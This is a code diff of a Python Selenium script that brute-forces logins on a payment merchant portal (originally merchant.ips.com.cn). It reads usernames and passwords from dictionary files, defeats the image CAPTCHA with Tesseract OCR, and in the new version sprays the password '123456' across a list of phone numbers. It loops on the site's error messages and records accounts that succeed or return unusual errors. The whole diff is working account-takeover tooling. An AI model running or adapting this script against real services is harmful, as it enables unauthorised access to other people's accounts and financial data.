@@ -1,13 +1,12 @@
-#import pytesseract
+# import pytesseract
+from time import sleep
+
 import tesserocr
 from PIL import Image
 from selenium import webdriver
 from selenium.common.exceptions import NoSuchElementException
-from tesserocr import PyTessBaseAPI
-# tesseract.exe所在的文件路径
-from selenium.webdriver.support.wait import WebDriverWait
+from selenium_test import global_var
 
-#pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
 
 class IpsSign:
 
@@ -21,13 +20,26 @@ class IpsSign:
         # 异常的用户密码字典
         self.unusual_account_dict = {}
         # 错误判断标签
-        self.warn_xpath_string = "//span[@id='lbWarning']"
+        # self.warn_xpath_string = global_var.hn_warn_string.replace("'","'")
+        # self.warn_xpath_string ="//class[@class='frame-p-error-msg']"
+        self.warn_xpath_string = "frame-p-error-msg"
         # 获取driver
         self.driver = webdriver.Firefox(
             executable_path=r'F:\software\python\python3.7\Tools\geckodriver\geckodriver.exe')
         # self.driver = webdriver.Chrome(executable_path=r'F:\software\python\python3.7\Tools\geckodriver\chromedriver.exe')
 
+        # 登录按钮、账户、密码的标签id
+        self.login_button_class_name = global_var.ke_login_button_classname
+        self.user_name_id = global_var.ke_user_name_id
+        self.user_name_class_name = global_var.ke_user_name_classname
+        self.password_id = global_var.ke_password_id
+
+        # 字典路径
+        self.user_name_dic = "dictionary/phone_number"
+        self.password_dic = "dictionary/user_pwd_dic"
+
         # 从字典中获取数据
+
         self.merchant_code_dic_generator = self.get_merchant_code_dic_generator()
 
         self.user_name_dic_generator = self.get_user_name_dic_generator()
@@ -38,7 +50,7 @@ class IpsSign:
 
     # 从字典中读取数据生成器
     def get_merchant_code_dic_generator(self):
-        with open('dictionary/merchant_code_dic', 'r') as f:
+        with open('dictionary/phone_number', 'r') as f:
             while True:
                 lines = f.readlines(1000)
                 if not lines:
@@ -47,7 +59,7 @@ class IpsSign:
                     yield line.replace("\n", "")
 
     def get_user_name_dic_generator(self):
-        with open('dictionary/user_name_dic', 'r') as f:
+        with open('dictionary/phone_number', 'r') as f:
             while True:
                 lines = f.readlines(1000)
                 if not lines:
@@ -89,7 +101,7 @@ class IpsSign:
 
     # 获取driver
     def get_driver(self):
-        self.driver.get("http://merchant.ips.com.cn/Login.aspx?logType=1")
+        self.driver.get(global_var.ke_login_url)
 
     # 转换到普通管理员登录
     def convert_to_ordinaryadmin(self):
@@ -113,9 +125,9 @@ class IpsSign:
 
     # 读取验证码内容
     def get_CAPTCHA_content(self):
-        image_dir = "screen_shot/screenshot_capture_1.png"
+        str1 = "screen_shot/screenshot_capture_1.png"
         # 新建Image对象
-        image = Image.open(image_dir)
+        image = Image.open(str1)
         # 进行置灰处理
         image = image.convert('L')
         # 二值化阈值
@@ -126,30 +138,25 @@ class IpsSign:
                 table.append(0)
             else:
                 table.append(1)
-        # 通过表格转换成二进制图片，1的作用是白色，否则就是黑色
+        # 通过表格转换成二进制图片，1的作用是白色，不然就全部黑色了
         image = image.point(table, "1")
         # image.show()
-        with PyTessBaseAPI(path='F:/software/tesserOcr/tessdata/.',lang='eng') as tess_api:
-            tess_api.SetImage(image)
-            print(tess_api.GetUTF8Text())
-            self.result = tess_api.GetUTF8Text()
-            print("当前验证码" + self.result)
+        self.result = tesserocr.image_to_text(image).replace("\x0c", "").replace("\n", "")
+        print("当前验证码" + self.result)
 
     # 输入账户密码
-    def enter_acount_and_password(self):
+    def enter_count_and_password(self):
         driver = self.driver
 
-        driver.find_element_by_id("txtMerchantCode").clear()
+        driver.find_element_by_id(global_var.ke_user_name_id).clear()
         print("当前账号" + self.single_row_dict['merchant_code_dic'])
-        driver.find_element_by_id("txtMerchantCode").send_keys(self.single_row_dict['merchant_code_dic'])
+        driver.find_element_by_id(global_var.ke_user_name_id).send_keys(self.single_row_dict['merchant_code_dic'])
 
-        driver.find_element_by_id("txtUserName").clear()
-        print("当前商户号" + self.single_row_dict['user_name_dic'])
-        driver.find_element_by_id("txtUserName").send_keys(self.single_row_dict['user_name_dic'])
 
-        driver.find_element_by_id("txtUserPwd").clear()
+        driver.find_element_by_id(self.password_id).clear()
         print("当前密码" + self.single_row_dict['user_pwd_dic'])
-        driver.find_element_by_id("txtUserPwd").send_keys(self.single_row_dict['user_pwd_dic'])
+        # driver.find_element_by_id(self.password_id).send_keys(self.single_row_dict['user_pwd_dic'])
+        driver.find_element_by_id(self.password_id).send_keys("123456")
 
     # 输入验证码
     def enter_CAPTCHA(self):
@@ -160,13 +167,13 @@ class IpsSign:
     # 点击登录
     def click_login(self):
         driver = self.driver
-        driver.find_element_by_id("btnLogin").click()
+        driver.find_element_by_class_name(self.login_button_class_name).click()
 
     # 通过xpath_string判断标签是否存在
     def is_element_present(self, xpath_string):
         driver = self.driver
         try:
-            element = driver.find_element_by_xpath(xpath_string)
+            element = driver.find_element_by_class_name(xpath_string)
             return True
         # 原文是except NoSuchElementException, e:
         except NoSuchElementException as e:
@@ -176,39 +183,36 @@ class IpsSign:
     # 判断标签的值并返回
     def get_element_value(self, xpath_string):
         driver = self.driver
-        element = driver.find_element_by_xpath(xpath_string)
+        element = driver.find_element_by_class_name(xpath_string)
         element_value = element.text
         return element_value
 
     # 一个登录的过程
     def driver_ordinaryadmin_login(self):
         self.get_driver()
-        self.convert_to_ordinaryadmin()
         self.no_convert_to_login()
 
     # 在原页面重新输入数据登陆
     def no_convert_to_login(self):
-        self.get_CAPTCHA_picture()
-        self.get_CAPTCHA_content()
-        self.enter_acount_and_password()
-        self.enter_CAPTCHA()
+        self.enter_count_and_password()
         self.click_login()
 
     # 使用原来的密码 只更改验证码登录
     def use_same_account_to_login(self):
         driver = self.driver
-        driver.find_element_by_id("txtUserPwd").clear()
-        driver.find_element_by_id("txtUserPwd").send_keys(self.single_row_dict['user_pwd_dic'])
+        driver.find_element_by_id(self.password_id).clear()
+        driver.find_element_by_id(self.password_id).send_keys("123456")
+        # driver.find_element_by_id(self.password_id).send_keys(self.single_row_dict['user_pwd_dic'])
         self.get_CAPTCHA_picture()
         self.get_CAPTCHA_content()
         self.enter_CAPTCHA()
         self.click_login()
 
-    # 刷新页面并点击普通管理员
+    # 刷新页面并切换普通管理员登录
     def refresh_and_click_rdNormal(self):
         driver = self.driver
         driver.refresh()
-        driver.find_element_by_id("rdNormal").click()
+        # driver.find_element_by_id("rdNormal").click()
 
     # 循环登录
     def loop_to_sign(self):
@@ -218,29 +222,35 @@ class IpsSign:
 
         driver = self.driver
 
-        self.convert_to_ordinaryadmin()
-
         correct_account_count = 0
-        unusual_account_count = 0
+        sleep(5)
+
         while self.data_flag:
-        #for i in range(0, 100):
+            sleep(0.1)
+            # for i in range(0, 5):
+            # 如果错误元素不存在，说明是登录正确 进入到了账户页面
             if not self.is_element_present(self.warn_xpath_string):
-                self.result_message_dict = {}
-                self.result_message_dict.update(self.single_row_dict)
-                self.result_message_dict['information'] = ["正确的用户密码"]
-                self.correct_account_dict[correct_account_count] = [self.result_message_dict]
-                correct_account_count += 1
-                driver.back()
-                self.refresh_and_click_rdNormal()
+                # self.result_message_dict = {}
+                # self.result_message_dict.update(self.single_row_dict)
+                # self.result_message_dict['information'] = ["正确的用户密码"]
+                # self.correct_account_dict[correct_account_count] = [self.result_message_dict]
+                # correct_account_count += 1
+                # driver.back()
+                # self.refresh_and_click_rdNormal()
+                self.get_dict_data()
+                self.no_convert_to_login()
 
             elif self.get_element_value(self.warn_xpath_string) == "验证码不正确" or self.get_element_value(
                     self.warn_xpath_string) == "请输入验证码" or self.get_element_value(self.warn_xpath_string) == "验证码为四位数字":
                 self.no_convert_to_login()
 
-            elif self.get_element_value(self.warn_xpath_string) == "账号或密码错误。" or self.get_element_value(
-                    self.warn_xpath_string) == "":
+            elif self.get_element_value(self.warn_xpath_string) == global_var.hn_error_message[
+                'ENUP'] or self.get_element_value(
+                self.warn_xpath_string) == "":
                 self.get_dict_data()
                 self.no_convert_to_login()
+
+            # 额外的错误信息，保存此时的账户密码留待查看
             else:
                 self.result_message_dict = {}
                 self.result_message_dict.update(self.single_row_dict)
@@ -249,6 +259,7 @@ class IpsSign:
                 correct_account_count += 1
                 self.get_dict_data()
                 self.no_convert_to_login()
+
         print(self.correct_account_dict)
 
 
